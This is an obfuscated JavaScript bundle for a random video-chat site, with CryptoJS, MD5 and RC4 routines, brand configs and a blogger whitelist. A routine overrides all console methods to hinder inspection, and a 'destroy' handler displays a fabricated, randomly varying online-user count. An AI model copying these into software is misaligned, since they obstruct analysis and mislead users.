(function () {
  var e = _0x28ad;
  Array.prototype.first = function () {
    return this[0];
  };
}.call(this), function () {
  var e, n;
  e = jQuery, n = _0x28ad, e.fn.hasScrollBar = function () {
    var e, a = n;
    return !!(e = this.get(0)) && e.scrollHeight > e.clientHeight;
  };
}.call(this), function () {
  var e = _0x25991a;
  Number.prototype.times = function (n) {
    var a, f, i = e;
    if (this.valueOf()) for (a = 1, f = this.valueOf(); 1 <= f ? a <= f : a >= f; 1 <= f ? a++ : a--) n();
  };
}.call(this));
var CryptoJS = CryptoJS || function (e, n) {
  var a = _0x25991a, f = {}, i = f.lib = {}, u = function () {}, r = i.Base = {extend: function (e) {
    var n = a;
    u.prototype = this;
    var f = new u;
    return e && f.mixIn(e), f.hasOwnProperty("init") || (f.init = function () {
      var e = n;
      f.$super.init.apply(this, arguments);
    }), f.init.prototype = f, f.$super = this, f;
  }, create: function () {
    var e = a, n = this.extend();
    return n.init.apply(n, arguments), n;
  }, init: function () {}, mixIn: function (e) {
    var n = a;
    for (var f in e) e.hasOwnProperty(f) && (this[f] = e[f]);
    e.hasOwnProperty("toString") && (this.toString = e.toString);
  }, clone: function () {
    var e = a;
    return this.init.prototype.extend(this);
  }}, o = i.WordArray = r.extend({init: function (e, n) {
    var f = a;
    e = this.words = e || [], this.sigBytes = null != n ? n : 4 * e.length;
  }, toString: function (e) {
    return (e || t).stringify(this);
  }, concat: function (e) {
    var n = a, f = this.words, i = e.words, u = this.sigBytes;
    if (e = e.sigBytes, this.clamp(), u % 4) for (var r = 0; r < e; r++) f[u + r >>> 2] |= (i[r >>> 2] >>> 24 - r % 4 * 8 & 255) << 24 - (u + r) % 4 * 8; else if (65535 < i.length) for (r = 0; r < e; r += 4) f[u + r >>> 2] = i[r >>> 2]; else f.push.apply(f, i);
    return this.sigBytes += e, this;
  }, clamp: function () {
    var n = a, f = this.words, i = this.sigBytes;
    f[i >>> 2] &= 4294967295 << 32 - i % 4 * 8, f.length = e.ceil(i / 4);
  }, clone: function () {
    var e = a, n = r.clone.call(this);
    return n.words = this.words.slice(0), n;
  }, random: function (n) {
    for (var f = a, i = [], u = 0; u < n; u += 4) i.push(4294967296 * e.random() | 0);
    return new o.init(i, n);
  }}), c = f.enc = {}, t = c.Hex = {stringify: function (e) {
    var n = a, f = e.words;
    e = e.sigBytes;
    for (var i = [], u = 0; u < e; u++) {
      var r = f[u >>> 2] >>> 24 - u % 4 * 8 & 255;
      i.push((r >>> 4).toString(16)), i.push((15 & r).toString(16));
    }
    return i.join("");
  }, parse: function (e) {
    for (var n = a, f = e.length, i = [], u = 0; u < f; u += 2) i[u >>> 3] |= parseInt(e.substr(u, 2), 16) << 24 - u % 8 * 4;
    return new o.init(i, f / 2);
  }}, x = c.Latin1 = {stringify: function (e) {
    var n = a, f = e.words;
    e = e.sigBytes;
    for (var i = [], u = 0; u < e; u++) i.push(String.fromCharCode(f[u >>> 2] >>> 24 - u % 4 * 8 & 255));
    return i.join("");
  }, parse: function (e) {
    for (var n = a, f = e.length, i = [], u = 0; u < f; u++) i[u >>> 2] |= (255 & e.charCodeAt(u)) << 24 - u % 4 * 8;
    return new o.init(i, f);
  }}, s = c.Utf8 = {stringify: function (e) {
    var n = a;
    try {
      return decodeURIComponent(escape(x.stringify(e)));
    } catch (e) {
      throw Error("Malformed UTF-8 data");
    }
  }, parse: function (e) {
    return x.parse(unescape(encodeURIComponent(e)));
  }}, l = i.BufferedBlockAlgorithm = r.extend({reset: function () {
    var e = a;
    this._data = new o.init, this._nDataBytes = 0;
  }, _append: function (e) {
    var n = a;
    "string" == typeof e && (e = s.parse(e)), this._data.concat(e), this._nDataBytes += e.sigBytes;
  }, _process: function (n) {
    var f = a, i = this._data, u = i.words, r = i.sigBytes, c = this.blockSize, t = r / (4 * c);
    if (n = (t = n ? e.ceil(t) : e.max((0 | t) - this._minBufferSize, 0)) * c, r = e.min(4 * n, r), n) {
      for (var x = 0; x < n; x += c) this._doProcessBlock(u, x);
      x = u.splice(0, n), i.sigBytes -= r;
    }
    return new o.init(x, r);
  }, clone: function () {
    var e = a, n = r.clone.call(this);
    return n._data = this._data.clone(), n;
  }, _minBufferSize: 0});
  i.Hasher = l.extend({cfg: r.extend(), init: function (e) {
    var n = a;
    this.cfg = this.cfg.extend(e), this.reset();
  }, reset: function () {
    var e = a;
    l.reset.call(this), this._doReset();
  }, update: function (e) {
    var n = a;
    return this._append(e), this._process(), this;
  }, finalize: function (e) {
    var n = a;
    return e && this._append(e), this._doFinalize();
  }, blockSize: 16, _createHelper: function (e) {
    return function (n, a) {
      var f = _0x28ad;
      return new e.init(a).finalize(n);
    };
  }, _createHmacHelper: function (e) {
    return function (n, a) {
      var f = _0x28ad;
      return new d.HMAC.init(e, a).finalize(n);
    };
  }});
  var d = f.algo = {};
  return f;
}(Math);
(function () {
  var e = _0x25991a, n = CryptoJS, a = n.lib.WordArray, f = {};
  f.stringify = function (n) {
    var a = e, f = n.words, i = n.sigBytes, u = this._map;
    n.clamp(), n = [];
    for (var r = 0; r < i; r += 3) for (var o = (f[r >>> 2] >>> 24 - r % 4 * 8 & 255) << 16 | (f[r + 1 >>> 2] >>> 24 - (r + 1) % 4 * 8 & 255) << 8 | f[r + 2 >>> 2] >>> 24 - (r + 2) % 4 * 8 & 255, c = 0; 4 > c && r + .75 * c < i; c++) n.push(u.charAt(o >>> 6 * (3 - c) & 63));
    if (f = u.charAt(64)) for (; n.length % 4;) n.push(f);
    return n.join("");
  }, f.parse = function (n) {
    var f = e, i = n.length, u = this._map;
    (r = u.charAt(64)) && (-1 != (r = n.indexOf(r)) && (i = r));
    for (var r = [], o = 0, c = 0; c < i; c++) if (c % 4) {
      var t = u.indexOf(n.charAt(c - 1)) << c % 4 * 2, x = u.indexOf(n.charAt(c)) >>> 6 - c % 4 * 2;
      r[o >>> 2] |= (t | x) << 24 - o % 4 * 8, o++;
    }
    return a.create(r, o);
  }, f._map = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", n.enc.Base64 = f;
}(), function (e) {
  var n, a = _0x25991a, f = (n = true, function (e, a) {
    var f = n ? function () {
      var n = _0x28ad;
      if (a) {
        var f = a.apply(e, arguments);
        return a = null, f;
      }
    } : function () {};
    return n = false, f;
  });
  function i(e, n, a, f, i, u, r) {
    return ((e = e + (n & a | ~n & f) + i + r) << u | e >>> 32 - u) + n;
  }
  function u(e, n, a, f, i, u, r) {
    return ((e = e + (n & f | a & ~f) + i + r) << u | e >>> 32 - u) + n;
  }
  function r(e, n, a, f, i, u, r) {
    return ((e = e + (n ^ a ^ f) + i + r) << u | e >>> 32 - u) + n;
  }
  function o(e, n, a, f, i, u, r) {
    return ((e = e + (a ^ (n | ~f)) + i + r) << u | e >>> 32 - u) + n;
  }
  f(this, function () {
    var e, n = _0x28ad;
    try {
      e = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
    } catch (n) {
      e = window;
    }
    for (var a = e.console = e.console || {}, i = ["log", "warn", "info", "error", "exception", "table", "trace"], u = 0; u < i.length; u++) {
      var r = f.constructor.prototype.bind(f), o = i[u], c = a[o] || r;
      r.__proto__ = f.bind(f), r.toString = c.toString.bind(c), a[o] = r;
    }
  })();
  for (var c = CryptoJS, t = (s = c.lib).WordArray, x = s.Hasher, s = c.algo, l = [], d = 0; 64 > d; d++) l[d] = 4294967296 * e.abs(e.sin(d + 1)) | 0;
  s = s.MD5 = x.extend({_doReset: function () {
    var e = a;
    this._hash = new t.init([1732584193, 4023233417, 2562383102, 271733878]);
  }, _doProcessBlock: function (e, n) {
    for (var f = a, c = 0; 16 > c; c++) {
      var t = e[x = n + c];
      e[x] = 16711935 & (t << 8 | t >>> 24) | 4278255360 & (t << 24 | t >>> 8);
    }
    c = this._hash.words;
    var x = e[n + 0], s = (t = e[n + 1], e[n + 2]), d = e[n + 3], D = e[n + 4], b = e[n + 5], C = e[n + 6], m = e[n + 7], v = e[n + 8], g = e[n + 9], _ = e[n + 10], h = e[n + 11], w = e[n + 12], p = e[n + 13], y = e[n + 14], z = e[n + 15], B = i(B = c[0], F = c[1], M = c[2], L = c[3], x, 7, l[0]), L = i(L, B, F, M, t, 12, l[1]), M = i(M, L, B, F, s, 17, l[2]), F = i(F, M, L, B, d, 22, l[3]);
    B = i(B, F, M, L, D, 7, l[4]), L = i(L, B, F, M, b, 12, l[5]), M = i(M, L, B, F, C, 17, l[6]), F = i(F, M, L, B, m, 22, l[7]), B = i(B, F, M, L, v, 7, l[8]), L = i(L, B, F, M, g, 12, l[9]), M = i(M, L, B, F, _, 17, l[10]), F = i(F, M, L, B, h, 22, l[11]), B = i(B, F, M, L, w, 7, l[12]), L = i(L, B, F, M, p, 12, l[13]), M = i(M, L, B, F, y, 17, l[14]), B = u(B, F = i(F, M, L, B, z, 22, l[15]), M, L, t, 5, l[16]), L = u(L, B, F, M, C, 9, l[17]), M = u(M, L, B, F, h, 14, l[18]), F = u(F, M, L, B, x, 20, l[19]), B = u(B, F, M, L, b, 5, l[20]), L = u(L, B, F, M, _, 9, l[21]), M = u(M, L, B, F, z, 14, l[22]), F = u(F, M, L, B, D, 20, l[23]), B = u(B, F, M, L, g, 5, l[24]), L = u(L, B, F, M, y, 9, l[25]), M = u(M, L, B, F, d, 14, l[26]), F = u(F, M, L, B, v, 20, l[27]), B = u(B, F, M, L, p, 5, l[28]), L = u(L, B, F, M, s, 9, l[29]), M = u(M, L, B, F, m, 14, l[30]), B = r(B, F = u(F, M, L, B, w, 20, l[31]), M, L, b, 4, l[32]), L = r(L, B, F, M, v, 11, l[33]), M = r(M, L, B, F, h, 16, l[34]), F = r(F, M, L, B, y, 23, l[35]), B = r(B, F, M, L, t, 4, l[36]), L = r(L, B, F, M, D, 11, l[37]), M = r(M, L, B, F, m, 16, l[38]), F = r(F, M, L, B, _, 23, l[39]), B = r(B, F, M, L, p, 4, l[40]), L = r(L, B, F, M, x, 11, l[41]), M = r(M, L, B, F, d, 16, l[42]), F = r(F, M, L, B, C, 23, l[43]), B = r(B, F, M, L, g, 4, l[44]), L = r(L, B, F, M, w, 11, l[45]), M = r(M, L, B, F, z, 16, l[46]), B = o(B, F = r(F, M, L, B, s, 23, l[47]), M, L, x, 6, l[48]), L = o(L, B, F, M, m, 10, l[49]), M = o(M, L, B, F, y, 15, l[50]), F = o(F, M, L, B, b, 21, l[51]), B = o(B, F, M, L, w, 6, l[52]), L = o(L, B, F, M, d, 10, l[53]), M = o(M, L, B, F, _, 15, l[54]), F = o(F, M, L, B, t, 21, l[55]), B = o(B, F, M, L, v, 6, l[56]), L = o(L, B, F, M, z, 10, l[57]), M = o(M, L, B, F, C, 15, l[58]), F = o(F, M, L, B, p, 21, l[59]), B = o(B, F, M, L, D, 6, l[60]), L = o(L, B, F, M, h, 10, l[61]), M = o(M, L, B, F, s, 15, l[62]), F = o(F, M, L, B, g, 21, l[63]);
    c[0] = c[0] + B | 0, c[1] = c[1] + F | 0, c[2] = c[2] + M | 0, c[3] = c[3] + L | 0;
  }, _doFinalize: function () {
    var n = a, f = this._data, i = f.words, u = 8 * this._nDataBytes, r = 8 * f.sigBytes;
    i[r >>> 5] |= 128 << 24 - r % 32;
    var o = e.floor(u / 4294967296);
    for (i[15 + (r + 64 >>> 9 << 4)] = 16711935 & (o << 8 | o >>> 24) | 4278255360 & (o << 24 | o >>> 8), i[14 + (r + 64 >>> 9 << 4)] = 16711935 & (u << 8 | u >>> 24) | 4278255360 & (u << 24 | u >>> 8), f.sigBytes = 4 * (i.length + 1), this._process(), i = (f = this._hash).words, u = 0; 4 > u; u++) r = i[u], i[u] = 16711935 & (r << 8 | r >>> 24) | 4278255360 & (r << 24 | r >>> 8);
    return f;
  }, clone: function () {
    var e = a, n = x.clone.call(this);
    return n._hash = this._hash.clone(), n;
  }}), c.MD5 = x._createHelper(s), c.HmacMD5 = x._createHmacHelper(s);
}(Math), function () {
  var e, n = _0x25991a, a = CryptoJS, f = (e = a.lib).Base, i = e.WordArray, u = (e = a.algo).EvpKDF = f.extend({cfg: f.extend({keySize: 4, hasher: e.MD5, iterations: 1}), init: function (e) {
    var a = n;
    this.cfg = this.cfg.extend(e);
  }, compute: function (e, a) {
    for (var f = n, u = (t = this.cfg).hasher.create(), r = i.create(), o = r.words, c = t.keySize, t = t.iterations; o.length < c;) {
      x && u.update(x);
      var x = u.update(e).finalize(a);
      u.reset();
      for (var s = 1; s < t; s++) x = u.finalize(x), u.reset();
      r.concat(x);
    }
    return r.sigBytes = 4 * c, r;
  }});
  a.EvpKDF = function (e, a, f) {
    var i = n;
    return u.create(f).compute(e, a);
  };
}(), CryptoJS.lib.Cipher || function (e) {
  var n = _0x25991a, a = (_ = CryptoJS).lib, f = a.Base, i = a.WordArray, u = a.BufferedBlockAlgorithm, r = _.enc.Base64, o = _.algo.EvpKDF, c = a.Cipher = u.extend({cfg: f.extend(), createEncryptor: function (e, a) {
    var f = n;
    return this.create(this._ENC_XFORM_MODE, e, a);
  }, createDecryptor: function (e, a) {
    var f = n;
    return this.create(this._DEC_XFORM_MODE, e, a);
  }, init: function (e, a, f) {
    var i = n;
    this.cfg = this.cfg.extend(f), this._xformMode = e, this._key = a, this.reset();
  }, reset: function () {
    var e = n;
    u.reset.call(this), this._doReset();
  }, process: function (e) {
    var a = n;
    return this._append(e), this._process();
  }, finalize: function (e) {
    var a = n;
    return e && this._append(e), this._doFinalize();
  }, keySize: 4, ivSize: 4, _ENC_XFORM_MODE: 1, _DEC_XFORM_MODE: 2, _createHelper: function (e) {
    var a = n, f = {};
    return f.encrypt = function (n, f, i) {
      var u = a;
      return ("string" == typeof f ? h : g).encrypt(e, n, f, i);
    }, f.decrypt = function (n, f, i) {
      var u = a;
      return ("string" == typeof f ? h : g).decrypt(e, n, f, i);
    }, f;
  }}), t = {};
  t._doFinalize = function () {
    return this._process(true);
  }, t.blockSize = 1, a.StreamCipher = c.extend(t);
  var x = _.mode = {}, s = function (e, a, f) {
    var i = n, u = this._iv;
    u ? this._iv = void 0 : u = this._prevBlock;
    for (var r = 0; r < f; r++) e[a + r] ^= u[r];
  }, l = (a.BlockCipherMode = f.extend({createEncryptor: function (e, a) {
    var f = n;
    return this.Encryptor.create(e, a);
  }, createDecryptor: function (e, a) {
    var f = n;
    return this.Decryptor.create(e, a);
  }, init: function (e, a) {
    var f = n;
    this._cipher = e, this._iv = a;
  }})).extend(), d = {};
  d.processBlock = function (e, a) {
    var f = n, i = this._cipher, u = i.blockSize;
    s.call(this, e, a, u), i.encryptBlock(e, a), this._prevBlock = e.slice(a, a + u);
  }, l.Encryptor = l.extend(d);
  var D = {};
  D.processBlock = function (e, a) {
    var f = n, i = this._cipher, u = i.blockSize, r = e.slice(a, a + u);
    i.decryptBlock(e, a), s.call(this, e, a, u), this._prevBlock = r;
  }, l.Decryptor = l.extend(D), x = x.CBC = l;
  var b = {};
  b.pad = function (e, a) {
    for (var f, u = n, r = (f = (f = 4 * a) - e.sigBytes % f) << 24 | f << 16 | f << 8 | f, o = [], c = 0; c < f; c += 4) o.push(r);
    f = i.create(o, f), e.concat(f);
  }, b.unpad = function (e) {
    var a = n;
    e.sigBytes -= 255 & e.words[e.sigBytes - 1 >>> 2];
  }, l = (_.pad = {}).Pkcs7 = b;
  var C = {};
  C.mode = x, C.padding = l, a.BlockCipher = c.extend({cfg: c.cfg.extend(C), reset: function () {
    var e = n;
    c.reset.call(this);
    var a = (f = this.cfg).iv, f = f.mode;
    if (this._xformMode == this._ENC_XFORM_MODE) var i = f.createEncryptor; else i = f.createDecryptor, this._minBufferSize = 1;
    this._mode = i.call(f, this, a && a.words);
  }, _doProcessBlock: function (e, a) {
    var f = n;
    this._mode.processBlock(e, a);
  }, _doFinalize: function () {
    var e = n, a = this.cfg.padding;
    if (this._xformMode == this._ENC_XFORM_MODE) {
      a.pad(this._data, this.blockSize);
      var f = this._process(true);
    } else f = this._process(true), a.unpad(f);
    return f;
  }, blockSize: 4});
  var m = {};
  m.init = function (e) {
    this.mixIn(e);
  }, m.toString = function (e) {
    var a = n;
    return (e || this.formatter).stringify(this);
  };
  var v = a.CipherParams = f.extend(m), g = (x = (_.format = {}).OpenSSL = {stringify: function (e) {
    var a = n, f = e.ciphertext;
    return ((e = e.salt) ? i.create([1398893684, 1701076831]).concat(e).concat(f) : f).toString(r);
  }, parse: function (e) {
    var a = n, f = (e = r.parse(e)).words;
    if (1398893684 == f[0] && 1701076831 == f[1]) {
      var u = i.create(f.slice(2, 4));
      f.splice(0, 4), e.sigBytes -= 16;
    }
    var o = {};
    return o.ciphertext = e, o.salt = u, v.create(o);
  }}, a.SerializableCipher = f.extend({cfg: f.extend({format: x}), encrypt: function (e, a, f, i) {
    var u = n;
    i = this.cfg.extend(i);
    var r = e.createEncryptor(f, i);
    a = r.finalize(a), r = r.cfg;
    var o = {};
    return o.ciphertext = a, o.key = f, o.iv = r.iv, o.algorithm = e, o.mode = r.mode, o.padding = r.padding, o.blockSize = e.blockSize, o.formatter = i.format, v.create(o);
  }, decrypt: function (e, a, f, i) {
    var u = n;
    return i = this.cfg.extend(i), a = this._parse(a, i.format), e.createDecryptor(f, i).finalize(a.ciphertext);
  }, _parse: function (e, a) {
    var f = n;
    return "string" == typeof e ? a.parse(e, this) : e;
  }})), _ = (_.kdf = {}).OpenSSL = {execute: function (e, a, f, u) {
    var r = n;
    u || (u = i.random(8));
    var c = {};
    c.keySize = a + f, e = o.create(c).compute(e, u), f = i.create(e.words.slice(a), 4 * f), e.sigBytes = 4 * a;
    var t = {};
    return t.key = e, t.iv = f, t.salt = u, v.create(t);
  }}, h = a.PasswordBasedCipher = g.extend({cfg: g.cfg.extend({kdf: _}), encrypt: function (e, a, f, i) {
    var u = n;
    return f = (i = this.cfg.extend(i)).kdf.execute(f, e.keySize, e.ivSize), i.iv = f.iv, (e = g.encrypt.call(this, e, a, f.key, i)).mixIn(f), e;
  }, decrypt: function (e, a, f, i) {
    var u = n;
    return i = this.cfg.extend(i), a = this._parse(a, i.format), f = i.kdf.execute(f, e.keySize, e.ivSize, a.salt), i.iv = f.iv, g.decrypt.call(this, e, a, f.key, i);
  }});
}(), function () {
  var e = _0x25991a;
  function n() {
    for (var e = this._S, n = this._i, a = this._j, f = 0, i = 0; 4 > i; i++) {
      a = (a + e[n = (n + 1) % 256]) % 256;
      var u = e[n];
      e[n] = e[a], e[a] = u, f |= e[(e[n] + e[a]) % 256] << 24 - 8 * i;
    }
    return this._i = n, this._j = a, f;
  }
  var a = CryptoJS, f = a.lib.StreamCipher, i = a.algo, u = i.RC4 = f.extend({_doReset: function () {
    for (var n = e, a = (f = this._key).words, f = f.sigBytes, i = this._S = [], u = 0; 256 > u; u++) i[u] = u;
    for (var r = u = 0; 256 > u; u++) {
      var o = u % f;
      r = (r + i[u] + (a[o >>> 2] >>> 24 - o % 4 * 8 & 255)) % 256, o = i[u];
      i[u] = i[r], i[r] = o;
    }
    this._i = this._j = 0;
  }, _doProcessBlock: function (a, f) {
    var i = e;
    a[f] ^= n.call(this);
  }, keySize: 8, ivSize: 0});
  a.RC4 = f._createHelper(u);
  var r = {};
  r.drop = 192, i = i.RC4Drop = u.extend({cfg: u.cfg.extend(r), _doReset: function () {
    var a = e;
    u._doReset.call(this);
    for (var f = this.cfg.drop; 0 < f; f--) n.call(this);
  }}), a.RC4Drop = f._createHelper(i);
}(), function () {
  var e = _0x25991a, n = {Ё: "Yo", Й: "I", Ц: "Ts", У: "U", К: "K", Е: "E", Н: "N", Г: "G", Ш: "Sh"};
  n.Щ = "Sch", n.З = "Z", n.Х = "H", n.Ъ = "'", n.ё = "yo", n.й = "i", n.ц = "ts", n.у = "u", n.к = "k", n.е = "e", n.н = "n", n.г = "g", n.ш = "sh", n.щ = "sch", n.з = "z", n.х = "h", n.ъ = "'", n.Ф = "F", n.Ы = "I", n.В = "V", n.А = "a", n.П = "P", n.Р = "R", n.О = "O", n.Л = "L", n.Д = "D", n.Ж = "Zh", n.Э = "E", n.ф = "f", n.ы = "i", n.в = "v", n.а = "a", n.п = "p", n.р = "r", n.о = "o", n.л = "l", n.д = "d", n.ж = "zh", n.э = "e", n.Я = "Ya", n.Ч = "Ch", n.С = "S", n.М = "M", n.И = "I", n.Т = "T", n.Ь = "'", n.Б = "B", n.Ю = "Yu", n.я = "ya", n.ч = "ch", n.с = "s", n.м = "m", n.и = "i", n.т = "t", n.ь = "'", n.б = "b", n.ю = "yu", n.і = "i", n.І = "I", n.ї = "yi", n.Ї = "Yi";
  var a = n;
  window.translit = function (n) {
    var f = e;
    return n.split("").map(function (e) {
      return a[e] || e;
    }).join("");
  };
}(), function () {
  !function () {
    var e, n, a, f, i = _0x28ad, u = {};
    u.ometv = "https://play.google.com/store/apps/details?id=omegle.tv", u.chatalternative = "https://play.google.com/store/apps/details?id=com.chatroullete.alternative", u.chatruletka = "https://play.google.com/store/apps/details?id=com.chat.ruletka", u.minichat = "https://play.google.com/store/apps/details?id=mini.video.chat", e = u;
    var r = {};
    r.ometv = "https://itunes.apple.com/us/app/ometv-video-chat-alternative/id1252974010?ls=1&mt=8", r.minichat = "https://apps.apple.com/ua/app/minichat-video-chat-texting/id1506912979", f = r;
    var o = {};
    o.api_url = "https://null-point.com", o.lobby_url = "wss://point-of-entry.com/ws", o.video_cdn = "https://video-delivery.x-point-of-entry.com", o.room = "world", o.enable_geo = "true", o.container = document.getElementById("app"), o.release = 7.88, o.versionCode = 20, o.title = "", o.origin = 1999, o.show_logo = true, o.show_disclaimer = false, o.show_rules_text = true, o.android_app = "chatalternative", o.ios_app = "minichat", o.rules_link = "/rules", o.terms_link = "/terms", o.guidelines_link = "/communityguidelines", o.is_vk_app = false, o.vertical_layout = false, o.social_buttons = ["fb-like", "fb-share", "twitter"], o.gtag_id = "AW-804505777", o.gtag_conversion_id = "AW-804505777/6HhECOK71uIBELGRz_8C", o.gtag_checkout_id = "AW-804505777/FEJ2CKTWzOYBELGRz_8C", o.paypal_client_id = "AbiBd1Xvz4lTadm4f6ZIrkM4HY5xGMmoTraSbCeGiNB0sreZiEzn5j-5WPh2kB8GpYEDBUxshNJkvtXd", n = o;
    var c = {};
    c.sn_api_url = "https://b.minichat.com/api/v1/", c.fb_login_url = "https://b.minichat.com/auth/facebook1", c.vk_login_url = "https://b.minichat.com/auth/vkontakte", c.android_app = "ometv", c.ban_email = "contact@videochat.support", c.sn_title = "OmeTV";
    var t = {};
    t.sn_api_url = "https://b.chatrulez.ru/api/v1/", t.fb_login_url = "https://b.chatrulez.ru/auth/facebook", t.vk_login_url = "https://b.chatrulez.ru/auth/vkontakte1", t.android_app = "chatruletka", t.ban_email = "contact@chatruletka.com", t.sn_title = "Chatruletka", t.privacy_link = "https://chatruletka.com/privacy/";
    var x = {};
    x.sn_api_url = "https://b.minichat.com/api/v1/", x.fb_login_url = "https://b.minichat.com/auth/facebook", x.vk_login_url = "https://b.minichat.com/auth/vkontakte1", x.android_app = "minichat", x.ban_email = "contact@videochat.support", x.sn_title = "Minichat", x.privacy_link = "https://minichat.com/privacy";
    var s = {};
    s.sn_api_url = "https://b.chatrulez.ru/api/v1/", s.fb_login_url = "https://b.chatrulez.ru/auth/facebook1", s.vk_login_url = "https://b.chatrulez.ru/auth/vkontakte", s.android_app = "chatruletka", s.ban_email = "contact@videochat.support", s.sn_title = "Chat Rulez", s.privacy_link = "https://chatrulez.ru/privacy";
    var l = {};
    l.ome = c, l.chatruletka = t, l.minichat = x, l.chatrulez = s, a = l, window.config.env && (n = $.extend(n, a[window.config.env])), window.config = $.extend({}, n, window.config || {}), window.config.android_app_url = e[config.android_app], window.config.ios_app_url = f[config.ios_app];
  }();
}.call(this), function () {
  var e, n;
  n = _0x28ad, e = function (n) {
    var a, f = _0x28ad;
    return a = Math.round(50 * Math.random() + n - 20), ductTape.updateOnlineCounter(a), setTimeout(e.bind(this, a), 2e3);
  }, window.destroy = function () {
    var a = n;
    return window.bl = true, $(document).trigger("roulette:destroy"), window.countryFilter = null, e(this.online);
  };
}.call(this), function () {
  var e = _0x25991a;
  this.Helper = function () {
    var n = e;
    function a() {}
    return a.reload = function () {
      return location.reload();
    }, a.queryParam = function (e) {
      var a = n;
      return (location.search.match(new RegExp(e + "=(.*?)($|&)", "i")) || [])[1];
    }, a.isMac = function () {
      var e = n;
      return /Mac OS/.test(navigator.userAgent);
    }, a.isAndroid = function () {
      var e = n;
      return /(android)/i.test(navigator.userAgent);
    }, a.isIos = function () {
      var e = n;
      return /iPad|iPhone|iPod/.test(navigator.userAgent);
    }, a.isChrome = function () {
      var e = n;
      return /Chrome/.test(navigator.userAgent);
    }, a.isFirefox = function () {
      var e = n;
      return /Firefox/.test(navigator.userAgent);
    }, a.isMobile = function () {
      var e = n;
      return this.isAndroid() || this.isIos() || typeof window.orientation !== "undefined" && !this.isIPadPro();
    }, a.isIPadPro = function () {
      var e = n;
      return /Mac OS X/.test(navigator.userAgent) && "ontouchstart" in window && window.devicePixelRatio >= 2;
    }, a.measureText = function (e) {
      var a, f, i, u, r = n;
      return this.canvas || (this.canvas = document.createElement("canvas")), a = this.canvas.getContext("2d"), i = e.css("font-size"), f = e.css("font-family"), u = e.text().trim(), a.font = i + " " + f, a.measureText(u);
    }, a.vua = function () {
      var e, a = n;
      return (e = navigator.userAgent).length > 30 && e !== e.toLowerCase() && e.includes("/") && /\d+/g.test(e) && /\s/g.test(e) && !e.includes("Iron");
    }, a.isIE = function () {
      var e = n;
      return !!navigator.userAgent.match(/Trident.*rv\:11\./);
    }, a.getCookie = function (e) {
      var a, f, i = n;
      return f = "(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)", (a = document.cookie.match(new RegExp(f))) ? decodeURIComponent(a[1]) : void 0;
    }, a.isMacOrLinux = function () {
      var e = n;
      return -1 !== navigator.appVersion.indexOf("Mac") || -1 !== navigator.appVersion.indexOf("Linux");
    }, a;
  }();
}["call"](this), function () {
  var e = _0x25991a;
  this.Overlay = function () {
    var n = e;
    function a() {}
    return window.onOverlayClick = null, a.show = function (e, a) {
      var f, i, u = n;
      return i = $(e), window.onOverlayClick = a, $(".popup").removeClass("visible").hide(), f = $("#overlay"), i.show({duration: 0, complete: function () {
        var e = u;
        return f.css("visibility", "visible"), i.addClass("visible"), f.addClass("visible");
      }});
    }, a.hide = function (e) {
      var a, f = n;
      return window.onOverlayClick = null, (a = $("#overlay")).removeClass("visible"), e.removeClass("visible"), setTimeout(function () {
        var n = f;
        return a.css("visibility", "hidden"), e.hide();
      }, 50);
    }, a.hideAll = function () {
      var e = n;
      return this.hide($(".popup"));
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Resizer = function (n, a, f) {
    var i, u, r, o, c, t, x, s, l, d = e, D = {};
    D.resizeX = true, D.resizeY = true, D.minWidth = 0, D.maxWidth = 9999, D.minHeight = 0, D.maxheight = 9999, D.onresize = null, u = D, i = this, x = void 0, s = void 0, t = void 0, c = void 0, o = function (e) {
      var n = d;
      e.preventDefault(), t = a.width(), c = a.height(), x = e.clientX, s = e.clientY, $(document).on("mousemove", r), $(document).on("mouseup", l);
    }, r = function (e) {
      var n, a, f = d;
      e.preventDefault(), a = t + e.clientX - x, n = c - e.clientY + s, i.resize(a, n);
    }, l = function (e) {
      var n = d;
      e.preventDefault(), $(document).off("mousemove", r), $(document).off("mouseup", l);
    }, f = $.extend(u, f), n.on("mousedown", o), this.resize = function (e, n) {
      var i, u = d;
      i = false, f.resizeX && e && (e > f.maxWidth && (e = f.maxWidth), e < f.minWidth && (e = f.minWidth), i = true, a.width(e)), f.resizeY && n && (n > f.maxHeight && (n = f.maxHeight), n < f.minHeight && (n = f.minHeight), i = true, a.height(n)), e = a.width(), n = a.height(), f.onresize && typeof f.onresize === "function" && i && f.onresize(e, n);
    }, this.setMaxWidth = function (e) {
      var n = d;
      if (e > f.minWidth && (f.maxWidth = e), e > $(window).width()) return f.maxWidth = $(window).width() - 200;
    }, this.setMaxHeight = function (e) {
      var n = d;
      e > f.minHeight && (f.maxHeight = e);
    };
  };
}.call(this), function () {
  var e = _0x25991a;
  this.AppPopup = function () {
    var n = e;
    function a() {
      var e, n = _0x28ad;
      Helper.isIos() ? ($("#app-popup .appstore-btn").show(), $("#app-popup .app-popup-img-ios").css("display", "flex")) : ($("#app-popup .googleplay-btn").show(), $("#app-popup .app-popup-img-android").css("display", "flex")), e = $("#app-popup"), $(".popup-holder").addClass("bg"), $(".chat .app-buttons").hide(), Overlay.show(e);
    }
    return a.enabled = function () {
      var e = n;
      return Helper.isMobile() && !OmetvLanding.enabled();
    }, a;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.Blogger = function () {
    var n, a, f = e, i = {};
    i.allowFakeWebcam = false, i.allowVPN = true, i.hideWatermark = false, i.originId = 0, i.validBlogger = true, n = i;
    var u = {};
    u.hideWatermark = true, u.originId = 1027;
    var r = {};
    r.allowFakeWebcam = true, r.originId = 1001;
    var o = {};
    o.originId = 1023;
    var c = {};
    return c["Vata.Show.c26bf5bd2da95ee5968ac9c82de8093c"] = $.extend({}, n, u), c["Marcus.Veltri.ab1b04bad81d51ac391dd5be5a1214f5"] = $.extend({}, n, r), c["Evgeniy.Volnov.92a932e1925ae9bb5aa1661bd214ae13"] = $.extend({}, n, o), a = c, function () {
      var e, n = f;
      this.id = window.config.prankota ? "Evgeniy.Volnov.92a932e1925ae9bb5aa1661bd214ae13" : Helper.queryParam("blogger"), !this.id && (this.id = sessionStorage.getItem("bid")), e = a[this.id], sessionStorage.setItem("bid", this.id), null != e && window.config.origin === e.originId && ($.extend(this, e), window.history.replaceState({}, "", window.location.pathname), this.hideWatermark && $(".watermark").remove());
    };
  }();
